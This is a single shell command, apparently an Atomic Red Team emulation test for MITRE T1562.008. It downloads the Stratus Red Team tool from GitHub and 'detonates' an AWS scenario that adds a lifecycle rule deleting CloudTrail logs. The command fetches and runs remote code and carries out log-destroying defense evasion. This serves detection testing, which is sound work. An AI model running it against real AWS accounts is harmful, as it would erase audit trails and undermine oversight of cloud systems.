if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ "$(uname)" == "Darwin" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ "$(expr substr $(uname) 1 5)" == "Linux" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo "starting warmup"; ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule; echo "starting detonate"; ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force